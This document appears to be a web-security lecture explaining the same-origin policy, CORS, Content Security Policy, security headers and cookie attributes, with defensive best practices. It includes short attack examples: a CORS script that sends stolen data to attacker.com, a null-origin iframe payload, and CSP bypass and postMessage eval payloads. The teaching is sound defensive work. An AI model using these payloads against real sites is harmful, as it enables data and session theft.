# Browser Security Features

Modern web browsers implement multiple security mechanisms to protect users from various attacks. Understanding these features is crucial for both developing secure web applications and performing security assessments. This lecture explores the most important browser security features and how they can be configured, bypassed, or exploited.

## Same-Origin Policy (SOP)

The Same-Origin Policy (SOP) is the cornerstone of web security, preventing malicious scripts from one origin from accessing data from another origin. It's one of the oldest and most fundamental security mechanisms in web browsers.

### What Defines an Origin?

An origin is determined by the combination of three components:

- **Protocol Scheme**: The communication protocol (e.g., `http`, `https`)
- **Host Name**: The domain name or IP address (e.g., `example.com`)
- **Port Number**: The communication port (e.g., `80` for HTTP, `443` for HTTPS)

Two URLs have the **same origin** only if all three components are identical.

**Example Origin Comparison:**

Consider the base URL: `http://normal-website.com/example/example.html`

This uses scheme `http`, domain `normal-website.com`, and port `80`.

| **URL accessed**                        | **Access permitted?**              | **Reason** |
| --------------------------------------- | ---------------------------------- | ---------- |
| `http://normal-website.com/example/`      | ✅ Yes | Same scheme, domain, and port |
| `http://normal-website.com/example2/`     | ✅ Yes | Same scheme, domain, and port |
| `https://normal-website.com/example/`     | ❌ No | Different scheme and port |
| `http://en.normal-website.com/example/`   | ❌ No | Different domain (subdomain) |
| `http://www.normal-website.com/example/`  | ❌ No | Different domain (subdomain) |
| `http://normal-website.com:8080/example/` | ❌ No | Different port |
| `http://normal-website.com:80/example/`   | ✅ Yes | Port 80 is default for HTTP |

**Note**: Internet Explorer does NOT consider port number when applying SOP, making it less secure.

### SOP Policy Details

**What SOP Restricts:**

1. **Reading Responses**: Scripts from one origin cannot read responses from another origin
   - Prevents malicious site from reading your Gmail
   - XMLHttpRequest/Fetch API blocked for cross-origin reads

2. **Accessing DOM**: Cannot access DOM of documents from different origin
   - Cannot read `iframe` content from different origin
   - Cannot access `window` object properties from other origin

3. **Cookies**: Cookies set by origin only sent to that origin
   - `example.com` cannot read cookies from `bank.com`
   - Prevents cookie theft across domains

**What SOP Allows:**

1. **Sending Requests**: Can send requests to any origin
   - Response is opaque (cannot read)
   - Useful for analytics, CDNs

2. **Embedding Resources**: Can embed cross-origin resources
   - Images: `<img src="https://other-site.com/image.jpg">`
   - Scripts: `<script src="https://cdn.com/library.js"></script>`
   - Stylesheets: `<link rel="stylesheet" href="https://cdn.com/style.css">`
   - Fonts: `@font-face` declarations
   - Media: `<video>`, `<audio>` tags
   - Iframes: `<iframe>` (but cannot access content)

3. **Navigation**: Can navigate to different origins
   - Links: `<a href="https://other-site.com">`
   - Form submissions: `<form action="https://other-site.com">`
   - `window.location = "https://other-site.com"`

### SOP Implementation Details

**Cross-Domain Object Access:**

Some objects are **writable but not readable** cross-domain:

- `location` object
- `location.href` property from iframes or new windows

Some objects are **readable but not writable** cross-domain:

- `window.length` (number of frames)
- `window.closed` (whether window is closed)

**Allowed Cross-Domain Functions:**

- `window.close()`
- `window.blur()`
- `window.focus()`
- `window.postMessage()` (for secure cross-origin communication)
- `location.replace()`

### SOP Relaxation Mechanisms

#### 1. document.domain

Legacy mechanism to relax SOP for subdomains:

```javascript
// On marketing.example.com
document.domain = "example.com";

// On example.com
document.domain = "example.com";

// Now both can access each other's DOM
```

**Security Implications:**

- Allows subdomain to access parent domain
- Can be exploited if attacker controls any subdomain
- Modern browsers restrict to valid suffixes
- Deprecated in modern web security

**Exploitation Example:**
If attacker compromises `evil.example.com`, they can set `document.domain` to `example.com` and access main site data.

#### 2. postMessage API

Secure way for cross-origin communication:

**Sender:**

```javascript
// From origin A
const targetWindow = window.open('https://other-origin.com');
targetWindow.postMessage('Hello!', 'https://other-origin.com');
```

**Receiver:**

```javascript
// On origin B
window.addEventListener('message', (event) => {
  // CRITICAL: Always verify origin!
  if (event.origin !== 'https://trusted-origin.com') {
    return;
  }

  console.log('Received:', event.data);

  // Send response
  event.source.postMessage('Hello back!', event.origin);
});
```

**Security Best Practices:**

1. Always validate `event.origin`
2. Validate `event.data` content
3. Use specific target origin, not `*`
4. Be cautious with `event.source`

**Insecure postMessage Example:**

```javascript
// VULNERABLE CODE - Missing origin check
window.addEventListener('message', (event) => {
  eval(event.data); // NEVER DO THIS!
});
```

Attacker can exploit:

```javascript
targetWindow.postMessage('alert(document.cookie)', '*');
```

### SOP and Cookies

Cookies follow a more relaxed policy than SOP:

**Cookie Scope:**

- Can be set for entire domain and subdomains
- `Domain=.example.com` includes all subdomains
- Path attribute controls URL path scope

**Cookie Access Example:**

```javascript
// Set cookie on example.com
document.cookie = "session=abc123; Domain=.example.com; Path=/";

// Now accessible from:
// - example.com
// - www.example.com
// - api.example.com
// - Any subdomain
```

**Security Implications:**

- Subdomain can set cookies for parent domain
- Subdomain compromise = full domain compromise
- Use specific domains when possible

**Mitigation:**

- Use `HttpOnly` flag (prevents JavaScript access)
- Use `Secure` flag (HTTPS only)
- Use `SameSite` attribute
- Don't rely on subdomains for security isolation

## Cross-Origin Resource Sharing (CORS)

CORS is a mechanism that allows servers to relax SOP for specific origins, enabling legitimate cross-origin requests while maintaining security.

### How CORS Works

**Simple Requests:**

For simple requests (GET, HEAD, POST with simple headers), browser sends:

```http
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
```

Server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

**Preflight Requests:**

For complex requests (PUT, DELETE, custom headers), browser sends OPTIONS preflight:

```http
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: X-Custom-Header
```

Server responds:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600
```

If preflight succeeds, browser sends actual request.

### CORS Headers

**Response Headers:**

- `Access-Control-Allow-Origin`: Which origins can access
  - `*` (wildcard - allows all, cannot use with credentials)
  - `https://specific-origin.com`
  - `null` (dangerous, can be exploited)

- `Access-Control-Allow-Credentials`: Allow cookies/auth
  - `true` or omitted (false)

- `Access-Control-Allow-Methods`: Allowed HTTP methods
  - `GET, POST, PUT, DELETE`

- `Access-Control-Allow-Headers`: Allowed custom headers
  - `Content-Type, Authorization, X-Custom-Header`

- `Access-Control-Max-Age`: Preflight cache duration
  - `3600` (seconds)

- `Access-Control-Expose-Headers`: Headers accessible to JavaScript
  - `X-Custom-Response-Header`

**Request Headers:**

- `Origin`: Request origin (set by browser, cannot be modified)
- `Access-Control-Request-Method`: Method for actual request
- `Access-Control-Request-Headers`: Headers for actual request

### CORS Misconfigurations

#### 1. Wildcard with Credentials

**Vulnerable Configuration:**

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Issue**: Browser rejects this! Cannot use wildcard with credentials.

**Workaround Attempt (Still Vulnerable):**

```javascript
// Server reflects Origin header
const origin = req.headers.origin;
res.setHeader('Access-Control-Allow-Origin', origin);
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

**Exploitation:**

```html
<script>
fetch('https://vulnerable-api.com/sensitive-data', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

#### 2. Null Origin

**Vulnerable Configuration:**

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploitation:**
Attacker can create null origin using sandboxed iframe or data URI:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
  fetch('https://vulnerable-api.com/data', {credentials: 'include'})
    .then(r => r.text())
    .then(data => {
      parent.postMessage(data, '*');
    });
</script>"></iframe>
```

#### 3. Insufficient Origin Validation

**Vulnerable Pattern:**

```javascript
// Only checks if origin contains trusted domain
if (origin.includes('example.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```

**Bypass:**

- `https://example.com.attacker.com` ✅ Contains "example.com"
- `https://attackerexample.com` ✅ Contains "example.com"

**Secure Validation:**

```javascript
const allowedOrigins = [
  'https://app.example.com',
  'https://www.example.com'
];

if (allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

#### 4. Pre-Domain Wildcard

**Vulnerable:**

```http
Access-Control-Allow-Origin: https://*.example.com
```

Browsers don't support wildcards in origin! Server must dynamically set origin.

### CORS Security Best Practices

1. **Whitelist Specific Origins**: Don't reflect arbitrary origins
2. **Avoid Null Origin**: Never allow `null`
3. **Proper Validation**: Use exact matching, not substring checks
4. **Minimize Credentials**: Only use `Access-Control-Allow-Credentials` when necessary
5. **Limit Methods**: Only allow required HTTP methods
6. **Limit Headers**: Only allow necessary custom headers
7. **Cache Safely**: Use appropriate `Max-Age` for preflight

## Content Security Policy (CSP)

CSP is a powerful security feature that mitigates XSS and other code injection attacks by controlling which resources can be loaded and executed.

### How CSP Works

Server sends CSP header specifying allowed resource sources:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'
```

Browser enforces policy, blocking violations and optionally reporting them.

### CSP Directives

**Fetch Directives** (Control resource loading):

- `default-src`: Fallback for other directives
- `script-src`: JavaScript sources
- `style-src`: CSS sources
- `img-src`: Image sources
- `font-src`: Font sources
- `connect-src`: XMLHttpRequest, WebSocket, fetch()
- `media-src`: `<audio>`, `<video>` sources
- `object-src`: `<object>`, `<embed>`, `<applet>`
- `frame-src`: `<iframe>` sources
- `worker-src`: Worker, SharedWorker, ServiceWorker
- `manifest-src`: Manifest sources

**Document Directives:**

- `base-uri`: Restricts `<base>` element URLs
- `sandbox`: Applies sandbox restrictions (like iframe sandbox)

**Navigation Directives:**

- `form-action`: Restricts form submission targets
- `frame-ancestors`: Restricts who can embed this page (replaces X-Frame-Options)

**Reporting Directives:**

- `report-uri`: Deprecated, use report-to
- `report-to`: Endpoint for violation reports

**Other Directives:**

- `upgrade-insecure-requests`: Upgrades HTTP to HTTPS
- `block-all-mixed-content`: Blocks mixed content

### CSP Source Values

**Keywords:**

- `'none'`: Block all
- `'self'`: Same origin
- `'unsafe-inline'`: Allow inline scripts/styles (dangerous!)
- `'unsafe-eval'`: Allow `eval()` (dangerous!)
- `'unsafe-hashes'`: Allow specific inline event handlers
- `'strict-dynamic'`: Trust dynamically added scripts
- `'report-sample'`: Include code sample in violation report

**Hosts:**

- `https://example.com`: Specific domain
- `https://*.example.com`: Subdomain wildcard
- `https:`: Any HTTPS source
- `data:`: Data URIs
- `blob:`: Blob URIs

**Nonces:**

- `'nonce-random123'`: Cryptographic nonce for inline scripts

**Hashes:**

- `'sha256-base64hash'`: Hash of inline script/style

### CSP Examples

**Strict CSP (Recommended):**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

**Moderate CSP:**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' https://cdn.example.com;
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

**Report-Only Mode** (Testing):**

```http
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-violation-report;
```

### CSP with Nonces

**Server generates random nonce:**

```javascript
const nonce = crypto.randomBytes(16).toString('base64');
res.setHeader('Content-Security-Policy', `script-src 'nonce-${nonce}'`);
```

**HTML includes nonce:**

```html
<script nonce="random123">
  // This script is allowed
  alert('Hello!');
</script>

<script>
  // This script is BLOCKED (no nonce)
  alert('Evil!');
</script>
```

### CSP Bypasses

#### 1. unsafe-inline

**Vulnerable Policy:**

```http
Content-Security-Policy: script-src 'self' 'unsafe-inline';
```

Any inline script works:

```html
<script>alert(document.cookie)</script>
<img src=x onerror="alert(1)">
```

#### 2. unsafe-eval

**Vulnerable Policy:**

```http
Content-Security-Policy: script-src 'self' 'unsafe-eval';
```

Allows eval-like functions:

```javascript
eval('alert(1)');
setTimeout('alert(1)', 0);
setInterval('alert(1)', 0);
Function('alert(1)')();
```

#### 3. JSONP Endpoints

**Vulnerable Policy:**

```http
Content-Security-Policy: script-src 'self' https://trusted-site.com;
```

If `trusted-site.com` has JSONP endpoint:

```html
<script src="https://trusted-site.com/jsonp?callback=alert(1)"></script>
```

#### 4. AngularJS CDN

**Vulnerable Policy:**

```http
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com;
```

Exploit using AngularJS:

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>
```

#### 5. base-uri Not Set

**Vulnerable - No base-uri restriction:**

```html
<base href="https://attacker.com/">
<script src="/evil.js"></script>
<!-- Loads https://attacker.com/evil.js -->
```

#### 6. Wildcard Subdomains

**Vulnerable Policy:**

```http
Content-Security-Policy: script-src 'self' https://*.example.com;
```

If attacker compromises any subdomain or finds user-content subdomain:

```html
<script src="https://user-content.example.com/attacker-file.js"></script>
```

### CSP Best Practices

1. **Use Nonces or Hashes**: Avoid `'unsafe-inline'`
2. **Avoid 'unsafe-eval'**: Rewrite code to not use eval
3. **Whitelist Carefully**: Each whitelisted domain increases attack surface
4. **Set base-uri**: `base-uri 'none'` or `base-uri 'self'`
5. **Set object-src**: `object-src 'none'` (blocks Flash, Java)
6. **Use strict-dynamic**: With nonces for better security
7. **Set frame-ancestors**: Prevent clickjacking
8. **Test with Report-Only**: Before enforcing
9. **Monitor Reports**: Track violations
10. **Upgrade Insecure Requests**: Use `upgrade-insecure-requests`

## Other Security Headers

### X-Frame-Options

Prevents clickjacking by controlling iframe embedding.

**Values:**

```http
X-Frame-Options: DENY
```

Cannot be embedded in any iframe.

```http
X-Frame-Options: SAMEORIGIN
```

Can only be embedded on same origin.

```http
X-Frame-Options: ALLOW-FROM https://trusted.com
```

Can be embedded on specified origin (deprecated, not widely supported).

#### Modern Alternative: CSP frame-ancestors

```http
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors https://trusted.com;
```

### X-Content-Type-Options

Prevents MIME sniffing attacks.

```http
X-Content-Type-Options: nosniff
```

**Purpose:**

- Prevents browser from interpreting files as different type
- Forces browser to respect declared `Content-Type`
- Prevents XSS via uploaded files

**Without nosniff:**

```html
<!-- Upload HTML file as image -->
<img src="/uploads/malicious.jpg">
<!-- Browser might execute as HTML if it detects HTML content -->
```

**With nosniff:**
Browser strictly follows Content-Type header.

### X-XSS-Protection

Legacy XSS filter (deprecated).

```http
X-XSS-Protection: 1; mode=block
```

**Values:**

- `0`: Disable filter
- `1`: Enable filter, sanitize
- `1; mode=block`: Enable filter, block page

**Issue:**

- Can introduce vulnerabilities
- Bypassed easily
- Deprecated in favor of CSP

**Recommendation:**

```http
X-XSS-Protection: 0
```

Disable it, use CSP instead.

### Strict-Transport-Security (HSTS)

Forces HTTPS usage.

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Directives:**

- `max-age`: Duration in seconds
- `includeSubDomains`: Apply to all subdomains
- `preload`: Include in browser's preload list

**Benefits:**

- Prevents SSL stripping attacks
- Prevents accidental HTTP access
- Improves SEO

**Preload List:**
Submit to <https://hstspreload.org/> for browser-level enforcement.

### Referrer-Policy

Controls Referer header sent with requests.

```http
Referrer-Policy: strict-origin-when-cross-origin
```

**Values:**

- `no-referrer`: Never send
- `no-referrer-when-downgrade`: Don't send on HTTPS→HTTP
- `origin`: Send only origin
- `origin-when-cross-origin`: Full URL same-origin, origin cross-origin
- `same-origin`: Only send for same-origin
- `strict-origin`: Origin only, not on HTTPS→HTTP
- `strict-origin-when-cross-origin`: Recommended default
- `unsafe-url`: Always send full URL (don't use!)

### Permissions-Policy (Feature-Policy)

Controls which browser features can be used.

```http
Permissions-Policy: geolocation=(), microphone=(), camera=(self)
```

**Features:**

- `geolocation`: Location API
- `microphone`: Microphone access
- `camera`: Camera access
- `payment`: Payment Request API
- `usb`: WebUSB API
- `fullscreen`: Fullscreen API

**Values:**

- `()`: Blocked for all
- `(self)`: Allowed for same origin
- `(self "https://trusted.com")`: Allowed for specific origins
- `*`: Allowed for all (not recommended)

## Subresource Integrity (SRI)

Ensures third-party resources haven't been tampered with.

**Usage:**

```html
<script src="https://cdn.example.com/library.js"
        integrity="sha384-hash_value_here"
        crossorigin="anonymous"></script>

<link rel="stylesheet" href="https://cdn.example.com/style.css"
      integrity="sha384-hash_value_here"
      crossorigin="anonymous">
```

**Generate Hash:**

```bash
openssl dgst -sha384 -binary library.js | openssl base64 -A
```

**Browser Behavior:**

- Downloads resource
- Computes hash
- Compares with `integrity` attribute
- Blocks if mismatch

**Benefits:**

- Protects against compromised CDNs
- Detects tampering
- Ensures resource authenticity

**Requirements:**

- Must use `crossorigin` attribute
- CORS headers must be configured
- Hash must match exactly

## Cookies Security Deep Dive

### Cookie Attributes Security

**Secure:**

```http
Set-Cookie: session=abc123; Secure
```

Only sent over HTTPS, never HTTP.

**HttpOnly:**

```http
Set-Cookie: session=abc123; HttpOnly
```

Not accessible via JavaScript `document.cookie`.

**SameSite:**

```http
Set-Cookie: session=abc123; SameSite=Strict
```

- `Strict`: Never sent on cross-site requests
- `Lax`: Sent on top-level GET navigations
- `None`: Always sent (requires Secure)

**SameSite Comparison:**

| Scenario | Strict | Lax | None |
|----------|--------|-----|------|
| Link from external site | ❌ | ✅ | ✅ |
| Form POST from external | ❌ | ❌ | ✅ |
| AJAX from external | ❌ | ❌ | ✅ |
| Iframe from external | ❌ | ❌ | ✅ |

**Complete Secure Cookie:**

```http
Set-Cookie: session=abc123;
            Secure;
            HttpOnly;
            SameSite=Strict;
            Path=/;
            Max-Age=3600
```

### Cookie Prefixes

**__Secure- Prefix:**

```http
Set-Cookie: __Secure-session=abc123; Secure; Path=/
```

- Must have Secure attribute
- Must be set over HTTPS

**__Host- Prefix:**

```http
Set-Cookie: __Host-session=abc123; Secure; Path=/
```

- Must have Secure attribute
- Must be set over HTTPS
- Must NOT have Domain attribute
- Path must be `/`

**Benefits:**

- Prevents subdomain override attacks
- Ensures HTTPS-only
- Stronger security guarantees

## Key Takeaways

- SOP is the foundation of web security, isolating origins
- CORS relaxes SOP but must be configured carefully
- CSP mitigates XSS through content restrictions
- Security headers provide defense-in-depth
- Cookie attributes are critical for session security
- Each security feature has potential misconfigurations
- Multiple layers of security are essential
- Always validate inputs even with security features
- Test security configurations thoroughly
- Modern browsers provide powerful security mechanisms

## Resources

### Same-Origin Policy

- MDN - Same-Origin Policy: <https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>
- PortSwigger - SOP: <https://portswigger.net/web-security/cors/same-origin-policy>

### CORS

- MDN - CORS: <https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS>
- PortSwigger - CORS: <https://portswigger.net/web-security/cors>
- CORS Misconfigurations: <https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties>

### Content Security Policy

- MDN - CSP: <https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>
- PortSwigger - CSP: <https://portswigger.net/web-security/cross-site-scripting/content-security-policy>
- Google CSP Evaluator: <https://csp-evaluator.withgoogle.com/>
- CSP Quick Reference: <https://content-security-policy.com/>

### Security Headers

- Security Headers Checker: <https://securityheaders.com/>
- OWASP Secure Headers Project: <https://owasp.org/www-project-secure-headers/>
- MDN - HTTP Security: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#security>

### Cookie Security

- MDN - Cookies: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies>
- OWASP - Session Management: <https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html>

### Tools

- **Burp Suite**: Test security configurations
- **OWASP ZAP**: Automated security testing
- **Browser DevTools**: Inspect headers and cookies
- **CSP Evaluator**: Validate CSP policies
- **SecurityHeaders.com**: Check security header implementation
